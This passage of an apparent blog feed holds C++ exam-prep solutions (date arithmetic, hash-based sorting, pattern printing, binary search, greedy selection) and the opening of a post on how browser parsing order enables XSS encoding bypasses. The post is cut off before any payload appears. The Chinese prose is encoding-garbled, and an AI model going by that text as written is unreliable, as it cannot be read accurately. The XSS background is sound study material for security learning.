<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(tmp.year != <span class="number">5000</span>)&#123;</span><br><span class="line">buff[tmp.year][tmp.month][tmp.day] = cnt++;  <span class="comment">//ä»ç¬¬é›¶å¤©å¼€å§‹ </span></span><br><span class="line">tmp.Nextday();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> d,y,m;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %s %d"</span>,&amp;d,s,&amp;y)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= <span class="number">12</span> ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(s,monthname[i]) == <span class="number">0</span>)&#123;</span><br><span class="line">m = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> count = buff[y][m][d] - buff[<span class="number">2019</span>][<span class="number">9</span>][<span class="number">16</span>] + <span class="number">1</span>;  <span class="comment">//æ‰¾ä¸€ä¸ªå‘¨ä¸€å¥½ç®— </span></span><br><span class="line"><span class="built_in">puts</span>(weekname[(count % <span class="number">7</span> + <span class="number">7</span>) %<span class="number">7</span>]);   <span class="comment">//ä¿è¯æ˜¯éè´Ÿæ•° </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Hashçš„åº”ç”¨"><a href="#Hashçš„åº”ç”¨" class="headerlink" title="Hashçš„åº”ç”¨"></a>Hashçš„åº”ç”¨</h4><p>å½“æ’åºè¶…è¿‡åƒä¸‡çº§åˆ«çš„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Hashï¼Œè¿™ä¸€ç±»çš„é¢˜ç›®éƒ½æ˜¯åœ¨ä¸€ä¸ªåŒºé—´å†…çš„æ•´æ•°ï¼Œä¸”å„ä¸ç›¸åŒï¼Œå¦‚æœæ¶‰åŠåˆ°è´Ÿæ•°å¯ä»¥ä½¿ç”¨åç§»é‡å»è§£å†³</p><p><img src="https://s2.ax1x.com/2019/09/17/nI0s3R.png" alt="nI0s3R.png" style="zoom: 80%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET 500000</span></span><br><span class="line"><span class="keyword">int</span> Hash[<span class="number">1000001</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">-500000</span>; i &lt;= <span class="number">500000</span>; i++)&#123;</span><br><span class="line">Hash[i + OFFSET] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">Hash[x+OFFSET] += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">500000</span> ; i &gt;= <span class="number">-500000</span>; i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(Hash[i+OFFSET] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(Hash[i+OFFSET])&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">Hash[i+OFFSET] --;</span><br><span class="line">m--;</span><br><span class="line"><span class="keyword">if</span>(m != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( m == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ’ç‰ˆé¢˜"><a href="#æ’ç‰ˆé¢˜" class="headerlink" title="æ’ç‰ˆé¢˜"></a>æ’ç‰ˆé¢˜</h4><p>å…³é”®æ˜¯æ¨ç®—å‡ºè¡Œä¹‹é—´çš„å…³ç³»ï¼Œæ¯ä¸€è¡Œå†…å®¹é‡Œé¢çš„å…³ç³»ï¼Œä¸€èˆ¬æœºè¯•è€ƒçš„ä¸å¤š</p><p><img src="https://s2.ax1x.com/2019/09/17/nI0fED.png" alt="nI0fED.png" style="zoom: 67%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF)&#123;</span><br><span class="line"><span class="keyword">int</span> Maxline = n + (n - <span class="number">1</span>) *<span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j &lt;= Maxline ; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j &lt;= Maxline -(n + (i - <span class="number">1</span>) * <span class="number">2</span>))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾ç±»"><a href="#æŸ¥æ‰¾ç±»" class="headerlink" title="æŸ¥æ‰¾ç±»"></a>æŸ¥æ‰¾ç±»</h4><p>æ™®é€šçš„æ•°ç»„éå†ä¸ç”¨è¯´ï¼Œä½†åœ¨å¤æ‚åº¦æå‡çš„æƒ…å†µä¸‹éœ€è¦æ›´é«˜æ•ˆçš„æœç´¢æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦ç»ƒä¹ çš„è¿˜æ˜¯äºŒåˆ†æœç´¢æ³•ï¼Œä½†æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨äºŒåˆ†æœç´¢éœ€è¦å…ˆè¿›è¡Œæ’åºï¼Œä¸»è¦çš„äºŒåˆ†æœç´¢ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> base= <span class="number">0</span>, top = size;</span><br><span class="line"><span class="keyword">while</span>(base&lt;=top)&#123;</span><br><span class="line"><span class="keyword">int</span> mid = (base+top)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(buff[mid] &lt;= target) base = mid+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> top = mid <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans = buff[top];</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/17/nokrBF.png" alt="nokrBF.png" style="zoom:67%;"></p><p><img src="https://s2.ax1x.com/2019/09/17/noACNj.png" alt="noACNj.png" style="zoom: 67%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> num[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">char</span> sex[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> Stu &amp;A) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strcmp</span>(num,A.num)&lt;<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;buff[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N,M;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;N)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; N ;i ++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %s %s %d"</span>,buff[i].num,buff[i].name,buff[i].sex,&amp;buff[i].age);</span><br><span class="line">&#125;</span><br><span class="line">sort(buff,buff+N);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;M);</span><br><span class="line"><span class="keyword">char</span> find[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i&lt; M; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,find);</span><br><span class="line"><span class="keyword">int</span> base = <span class="number">0</span>, top = N<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(base &lt;= top)&#123;</span><br><span class="line"><span class="keyword">int</span> mid = (base+top)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(find,buff[mid].num)==<span class="number">0</span>)&#123;</span><br><span class="line">ans = mid;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(find,buff[mid].num)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">top = mid <span class="number">-1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> base = mid+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans == <span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">"No Answer!\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%s %s %s %d\n"</span>,buff[ans].num,buff[ans].name,buff[ans].sex,buff[ans].age);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è´ªå¿ƒç±»"><a href="#è´ªå¿ƒç±»" class="headerlink" title="è´ªå¿ƒç±»"></a>è´ªå¿ƒç±»</h4><p>è¿™ç±»é¢˜ç›®çš„ä¸€ä¸ªç‰¹ç‚¹ä¹Ÿæ˜¯éœ€è¦æ’åºï¼Œå¯è§æ’åºçš„é‡è¦æ€§ï¼Œä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯è´ªå¿ƒå‘å¾—åˆ°çš„ç»“æœä¸ä¸€å®šæ˜¯æœ€ä¼˜è§£ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªè¿‘ä¼¼çš„æœ€ä¼˜è§£ï¼Œè¿™é‡Œè§åˆ°äº†ä¸¤ç§é¢˜ï¼Œä¸€ç§æ˜¯å›ºå®šé’±æ•°ä¹°æœ€é«˜ä»·æ ¼çš„ä¸œè¥¿ï¼Œå¦ä¸€ç§æ˜¯å›ºå®šæ—¶é—´çœ‹èŠ‚ç›®æ•°æœ€å¤šçš„ï¼Œåæ­£æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä»¥å•ä»·ä½œä¸ºæ’åºæ ‡å‡†ï¼Œç¬¬äºŒä¸ªæ˜¯ä»¥ç»“æŸæ—¶é—´ä½œä¸ºæ’åºæ ‡å‡†</p><p><img src="https://s2.ax1x.com/2019/09/17/noK8Bt.png" alt="noK8Bt.png" style="zoom: 80%;"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">goods</span>&#123;</span></span><br><span class="line"><span class="keyword">double</span> price;</span><br><span class="line"><span class="keyword">double</span> mass;</span><br><span class="line"><span class="keyword">double</span> mass_one;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> goods &amp;A) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> mass_one &gt; A.mass_one;</span><br><span class="line">&#125;</span><br><span class="line">&#125;buff[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">double</span> m;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%lf %d"</span>, &amp;m, &amp;n)!=EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(m == <span class="number">-1</span> &amp;&amp; n == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">0</span> ;i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf %lf"</span>,&amp;buff[i].mass,&amp;buff[i].price);</span><br><span class="line">buff[i].mass_one = buff[i].mass/buff[i].price;</span><br><span class="line">&#125;</span><br><span class="line">sort(buff,buff+n);</span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(idx &lt; n &amp;&amp; m &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(m &gt; buff[idx].price)&#123;</span><br><span class="line">ans += buff[idx].mass;</span><br><span class="line">m -= buff[idx].price;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">ans += m*buff[idx].mass_one;</span><br><span class="line">m = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">++idx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.3lf\n"</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¿ç ”çš„äº‹æƒ…ä»¤äººå¤´ç–¼ï¼Œè¿˜ä¸çŸ¥é“èƒ½ä¸èƒ½å»è‡ªå·±å¿ƒä»ªçš„å­¦æ ¡ï¼Œæ¯å¤©è¦å¤ä¹ ä¸€ä¸‹æœºè¯•ï¼Œçœ‹ç€è¿‘æœŸçš„æ¯”èµ›å¥½åƒå‡ºäº†ä¸€äº›å¾ˆæœ‰æ„æ€çš„ç‚¹ä¹Ÿä¸èƒ½å»å­¦ï¼ŒçœŸçš„éš¾å—ï¼Œåªèƒ½ç¡¬ç€å¤´çš®å¤ä¹ å…¶ä»–çš„ä¸€äº›ä¸æ„Ÿå…´è¶£çš„çŸ¥è¯†ï¼Œæˆ‘å¤ªéš¾
    
    </summary>
    
      <category term="ç®—æ³•" scheme="0verwatch.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="algorithm" scheme="0verwatch.top/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>xssç¼–ç ç»•è¿‡åŸç†ä»¥åŠä»ä¸­å­¦ä¹ åˆ°çš„å‡ ä¸ªä¾‹å­</title>
    <link href="0verwatch.top/xss-encodeorder.html"/>
    <id>0verwatch.top/xss-encodeorder.html</id>
    <published>2019-09-10T15:29:45.000Z</published>
    <updated>2019-09-29T07:42:35.624Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ€è¿‘çœ‹äº†ä¸€äº›xssåˆ©ç”¨æ–¹å¼ï¼Œå‘ç°æœ¬äººåœ¨ä»¥å‰å¯¹ç¼–ç ç»•è¿‡è¿™ä¸€ä¸ªç‚¹çš„åŸç†å¥½åƒæ²¡æœ‰å¤ªæœ¬è´¨æ€§çš„ç†è§£ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ç¯‡æ–‡ç« ï¼Œå¯¹æµè§ˆå™¨è¿›è¡Œè§£æçš„é¡ºåºæœ‰ä¸€ä¸ªè®°å½•ï¼Œä¹Ÿä»ä¸­æ”¶è·åˆ°ç‚¹ä¸œè¥¿ï¼Œå‡†å¤‡æ ¡èµ›å‡ºä¸€ä¸ªé¢˜ç›®å…³äºè¿™ä¸ªå†…å®¹<a id="more"></a>XD</p><h3 id="æµè§ˆå™¨æ¶‰åŠåˆ°è§£ææœºåˆ¶"><a href="#æµè§ˆå™¨æ¶‰åŠåˆ°è§£ææœºåˆ¶" class="headerlink" title="æµè§ˆå™¨æ¶‰åŠåˆ°è§£ææœºåˆ¶"></a>æµè§ˆå™¨æ¶‰åŠåˆ°è§£ææœºåˆ¶</h3><p>è°ˆåˆ°è¿™ä¸ªæ˜¯å› ä¸ºè¿™ç¯‡æ–‡ç« çš„æœ¬è´¨æ˜¯æµè§ˆå™¨çš„è§£æç¼–ç çš„é¡ºåºè§¦å‘çš„xssï¼Œè§£æä¸€ç¯‡HTMLæ–‡æ¡£æ—¶ä¸»è¦æœ‰ä¸‰ä¸ªå¤„ç†è¿‡ç¨‹ï¼šHTMLè§£æï¼ŒURLè§£æå’ŒJavaScriptè§£æï¼Œä¸€èˆ¬å…ˆæ˜¯HTMLè§£æï¼Œåé¢ä¸¤ä¸ªè§£æçœ‹æƒ…å†µè€Œå®šï¼ˆå­˜åœ¨äº‹ä»¶çš„æƒ…å†µæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼‰ï¼Œä½†å¤§å¤šæ•°éƒ½æ˜¯HTMLè§£æ-&gt;URLè§£æ-&gt;JavaScriptè§£æï¼Œokï¼Œé‚£å…ˆæ¥è§£é‡Šä¸€ä¸‹å„ç§è§£ææœºåˆ¶ã€‚å¤§ç¥çº§åˆ«å¯ä»¥è·³è¿‡ï¼Œç›´æ¥çœ‹é‚£å‡ ä¸ªxssä¾‹å­å§ï¼Œæƒ¨~</p><h4 id="HTMLè§£æ"><a href="#HTMLè§£æ" class="headerlink" title="HTMLè§£æ"></a>HTMLè§£æ</h4><p>åœ¨äº†è§£HTMLè§£æçš„å…ˆæ¥äº†è§£ä¸€æ³¢ä»€ä¹ˆæ˜¯HTMLå­—ç¬¦å®ä½“ï¼Œå› ä¸ºHTMLä¸­æœ‰äº›å­—ç¬¦æ˜¯å’Œå…³é”®è¯å†²çªçš„ï¼Œæ¯”å¦‚<code>&lt;ã€&gt;ã€&amp;</code>ï¼Œè§£ç ä¹‹åï¼Œæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯æ ‡ç­¾ï¼Œè§£å†³çš„åŠæ³•å°±æ˜¯HTMLæºä»£ç ä¸­ä½¿ç”¨å­—ç¬¦å®ä½“ï¼Œæ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„ç©ºæ ¼<code>&amp;nbsp;</code>ï¼Œå­—ç¬¦å®ä½“ä»¥&amp;å¼€å¤´+é¢„å…ˆå®šä¹‰çš„å®ä½“åç§°è¡¨ç¤ºï¼Œ<strong>ä½†ä¸æ˜¯æ‰€æœ‰çš„å­—ç¬¦éƒ½æœ‰å®ä½“åç§°</strong>ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰å®ä½“ç¼–å·ï¼Œä¹Ÿå¯ä»¥ç”¨&amp;#å¼€å¤´+å®ä½“ç¼–å·+åˆ†å·è¡¨</p><p><img src="https://s2.ax1x.com/2019/09/10/nU30SI.png" alt="nU30SI.png"></p><p>è¦æ˜¯å¯¹phpç†Ÿæ‚‰çš„åŒå­¦ï¼Œå°±ä¼šçŸ¥é“phpä¸­å­˜åœ¨htmlspecialchars()å‡½æ•°å°±æ˜¯å°†ä¸€äº›ä¼šäº§ç”Ÿæ­§ä¹‰çš„ç¬¦å·è½¬ç§»æˆå®ä½“ç¼–å·ï¼Œå¯¹xssèµ·åˆ°äº†é˜²æŠ¤ä½œç”¨ã€‚</p><p>htmlæ˜¯å¦‚ä½•è§£æçš„ï¼Ÿå¯ä»¥çœ‹ä¸€ä¸‹HTMLçš„è¯æ³•è§£æè¿‡ç¨‹<a href="https://html.spec.whatwg.org/multipage/parsing.html" target="_blank" rel="noopener">ä¼ é€é—¨</a>ï¼Œå®˜æ–¹æ˜¯ä»¥çŠ¶æ€æœºè§£é‡Šçš„ï¼Œè¿™é‡Œæˆ‘ç”¨è‡ªå·±çš„è¯æ€»ç»“ä¸€ä¸‹ï¼Œç®€å•çš„è¯´ï¼Œæµè§ˆå™¨åœ¨è§£æä¸€ä¸ªHTMLæ–‡æ¡£æ—¶ï¼Œä¼šæŒ‰ç…§ä»ä¸Šè‡³ä¸‹ï¼Œä»å·¦è‡³å³ä¾æ¬¡è¿›è¡Œè§£æã€‚åœ¨ç¢°åˆ°<code>&lt;</code>æ—¶ï¼Œå°±è¿›å…¥è§£æå…ƒç´ æ ‡ç­¾çš„çŠ¶æ€ï¼Œåé¢è·Ÿç€çš„å†…å®¹è¢«é»˜è®¤æ˜¯æ ‡ç­¾å…ƒç´ å†…çš„å†…å®¹ï¼Œç›´åˆ°ç¢°åˆ°<code>&gt;</code>ç»“æŸã€‚æ‰€ä»¥æˆ‘ä»¬è¦ä½¿<code>&lt;&gt;</code>èƒ½å¤Ÿæ­£å¸¸è¢«å±•ç¤ºçš„è¯ï¼Œå°±å¾—å¯¹å…¶è¿›è¡Œå®ä½“ç¼–ç ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://s2.ax1x.com/2019/09/10/nUa6iT.png" alt="nUa6iT.png"></p><p><img src="https://s2.ax1x.com/2019/09/10/nUaLSe.png" alt="nUaLSe.png"></p><p>å¯¹äºHTMLå­—ç¬¦å®ä½“ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„åªæœ‰æœ‰ä¸‰ç§æƒ…å†µå¯ä»¥å®¹çº³å­—ç¬¦å®ä½“ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸æ˜¯ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å®ä½“ç¼–ç ï¼Œåªæœ‰åœ¨â€œæ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ï¼Œâ€œRCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€å’Œâ€œå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€è¿™äº›çŠ¶æ€ä¸­HTMLå­—ç¬¦å®ä½“å°†ä¼šä»â€œ&amp;#â€¦â€å½¢å¼è§£ç ï¼Œå¯¹åº”çš„è§£ç å­—ç¬¦ä¼šè¢«æ”¾å…¥æ•°æ®ç¼“å†²åŒºä¸­ï¼Œæ³¨æ„ç°åœ¨çš„é‡ç‚¹æ”¾åœ¨å“ªé‡Œå¯ä»¥è§£æHTMLç¼–ç ã€‚</p><p>è§£é‡Šä¸€ä¸‹è¿™ä¸‰ç§çŠ¶æ€ï¼Œç¬¬ä¸€ä¸ªï¼Œæ•°æ®çŠ¶æ€å°±ç±»ä¼¼äºåœ¨è§£æä¸€ä¸ªæ ‡ç­¾å†…é‡Œé¢çš„å†…å®¹ï¼Œå¦‚<code>&lt;div&gt;...&lt;/div&gt;</code> å½“æµè§ˆå™¨è§£æå®Œdivæ ‡ç­¾ä¹‹åå¦‚æœæ ‡ç­¾å†…å«æœ‰è½¬ä¹‰å­—ç¬¦çš„è¯ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªå®ä½“ç¼–ç è§£æäº†ï¼Œå¦‚ï¼š</p><figure class="highlight 